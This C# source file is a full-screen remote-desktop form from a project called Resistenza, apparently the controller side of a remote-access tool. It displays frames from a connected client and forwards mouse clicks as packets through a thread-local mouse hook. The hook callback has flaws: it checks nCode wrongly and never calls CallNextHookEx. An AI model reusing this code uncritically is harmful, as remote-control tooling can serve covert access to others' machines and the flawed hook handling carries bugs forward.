using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Resistenza.Common;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Remote_Desktop;
using Resistenza.Server.Networking;

namespace Resistenza.Server.Forms
{
    public partial class FullScreenDesktop : Form
    {
        public FullScreenDesktop(ConnectedClient Client, MonitorDeviceInfo MonitorInfo)
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Maximized;

            this.Text = $"{MonitorInfo.MonitorName}@{Client.IpAddress}";

            FramePictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            _MouseHook = IntPtr.Zero;
            _KeyboardHook = IntPtr.Zero;
            _MonitorInfo = MonitorInfo;

            _MouseEventHandler = MouseEventCallback;

            _Client = Client;
            InteractiveMode = false;

        }

        public bool InteractiveMode { get; set; }

        private ConnectedClient _Client;
        private MonitorDeviceInfo _MonitorInfo;

        private HookProc _MouseEventHandler;
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookExA(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        private static int WH_MOUSE = 7;

        //private enum MouseMessages
        //{
        //    WM_MOUSEMOVE = 0x0200,
        //    WM_LBUTTONDOWN = 0x0201,
        //    WM_LBUTTONUP = 0x0202,
        //    WM_RBUTTONDOWN = 0x0204,
        //    WM_RBUTTONUP = 0x0205,
        //    WM_MBUTTONDOWN = 0x0207,
        //    WM_MBUTTONUP = 0x0208,
        //    WM_MOUSEWHEEL = 0x020A,
        //    WM_XBUTTONDOWN = 0x020B,
        //    WM_XBUTTONUP = 0x020C,
        //    WM_MOUSEHWHEEL = 0x020E
        //}


        private IntPtr _MouseHook;
        private IntPtr _KeyboardHook;

        public void StartInteractionMode()
        {
            FramePictureBox.MouseEnter += FramePictureBox_MouseEnter;
            FramePictureBox.MouseLeave += FramePictureBox_MouseLeave;
        }


        public void StopInteractionMode()
        {
            FramePictureBox.MouseEnter -= FramePictureBox_MouseEnter;
            FramePictureBox.MouseLeave -= FramePictureBox_MouseLeave;
        }

        private void FramePictureBox_MouseEnter(object? sender, EventArgs e)
        {
            _MouseHook = SetWindowsHookExA(WH_MOUSE, _MouseEventHandler, IntPtr.Zero, GetCurrentThreadId());
            //_KeyboardHook = SetWindowsHookExA(WH_KEYBOARD, _proc, IntPtr.Zero, GetCurrentThreadId());

        }

        private void FramePictureBox_MouseLeave(object? sender, EventArgs e)
        {
            UnhookWindowsHookEx(_MouseHook);
        }


        private IntPtr MouseEventCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode != 0)//viene inviato dal processo corrente
            {
                MouseMessages Message = (MouseMessages)wParam;

                switch (Message)
                {
                    case MouseMessages.WM_RBUTTONDOWN:
                    case MouseMessages.WM_LBUTTONDOWN:

                        Point ScreenPos = Cursor.Position;
                        Point controlPos = FramePictureBox.PointToClient(ScreenPos);
                       
                        int ClientScreenWidth = _MonitorInfo.ScreenWidth;
                        int ClientScreenHeight = _MonitorInfo.ScreenHeight;

                        int ClientX = (controlPos.X * ClientScreenWidth) / FramePictureBox.Width;
                        int ClientY = (controlPos.Y * ClientScreenHeight) / FramePictureBox.Height;

                        DesktopMouseActionRequest MouseEventRequest = new DesktopMouseActionRequest()
                        {
                            MousePosX = ClientX,
                            MousePosY = ClientY,
                            MouseMessage = Message,
                        };

                        Task sendT = _Client.CustomStream.SendPacketAsync(MouseEventRequest);
                        sendT.Wait();
                        break;

                }

            }

            return IntPtr.Zero;
        }




        public void AddFrame(Bitmap Frame)
        {
            FramePictureBox.Image = Frame;
        }

       
    }
}
